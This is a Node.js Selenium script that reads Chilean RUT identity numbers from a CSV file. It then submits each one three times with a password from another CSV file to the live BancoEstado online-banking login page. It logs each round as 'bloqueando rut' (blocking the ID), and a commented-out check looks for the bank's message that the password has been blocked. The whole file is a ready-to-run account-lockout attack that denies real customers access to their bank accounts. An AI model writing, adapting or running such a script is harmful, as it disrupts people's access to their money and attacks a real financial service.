const {Builder, By, Key, until} = require('selenium-webdriver');  

const csv = require('csv-parser');
const fs = require('fs');

//const chrome = require('selenium-webdriver/chrome');

(async function bloqueos() {
    let driver
    let pass
    try {

        //let password = []
        fs.createReadStream('pass.csv')
        .pipe(csv())
        .on('data', (objectPass) => {
            const keyPass = Object.keys(objectPass)
            //console.log(objectPass);
            pass = objectPass[keyPass].split(";")[0]
            console.log(pass);
        })
        .on('end',  () => {
            console.log('CSV file successfully Pass processed');
        })



        let ruts = []
        fs.createReadStream('data.csv')
        .pipe(csv())
        .on('data', (objectRut) => {
            //console.log(objectRut);
              const key = Object.keys(objectRut)
              const rut = objectRut[key].split(";")[0] 
              //const rut = objectRut[key].split(";")[1]

              //console.log(rut);
              //const name = objectRut[key].split(";")[0]
              ruts = [...ruts,rut]
        })
        .on('end', () => {
           console.log('CSV file successfully Ruts processed');
        });

        await new Promise(resolve => setTimeout(resolve, 3000))
       // ruts.map(rut => rut.replace(";",""))
       /**abre encabezadode chrome  */
       driver = await new Builder().forBrowser('chrome').build();


        /**oculta encabezado   de chrome   */
        //driver = await new Builder().forBrowser('chrome').setChromeOptions(new chrome.Options().headless()).build();


        // Enter text "cheese" and perform keyboard action "Enter"
        for(let rut of ruts)
        {
            try{        
                //capturar html
                /* const page = await driver.getPageSource();
                console.log(page); */

                /** iteracion */
                for(let i = 1;i<=3;i++){

                    // await driver.get('https://bancapersonas.bancoestado.cl/eBankingBech/login/caja_login.htm');
                    driver.navigate().to('https://bancapersonas.bancoestado.cl/eBankingBech/login/caja_login.htm');
                    await new Promise(resolve => setTimeout(resolve, 3000))
                    await driver.findElement(By.id('username')).sendKeys(rut);
                    /**expah accede a formulario */
                    //await driver.findElement(By.xpath('//*[@id="username"]')).sendKeys(rut);

                    await driver.findElement(By.id('password')).sendKeys(pass);
                    //await driver.findElement(By.id('password')).sendKeys('1234');
                    await driver.findElement(By.id('enviar')).click();



                    let index = await driver.getPageSource();

                    let notAvailable = await (index.indexOf("En estos momentos no podemos atenderlo, inténtelo más tarde."))
                    //let blockedAccount =   await (index.indexOf("por seguridad tu clave de Internet ha sido bloqueada."))
                    if( notAvailable != -1){
                        console.log("No se atendio la peticion Numero:"+i+" de rut:"+rut)
                        
                    }
                    else{
                        console.log(i+"- bloqueando rut:"+rut)
                    } 


                    await new Promise(resolve => setTimeout(resolve, 3000))
                }
            }
            catch(err)
            {
                console.log(err)
            } 
        }        
    }
    catch(err)
    {
        console.log(err)
    }
    finally{
        await driver.quit()
    }
})();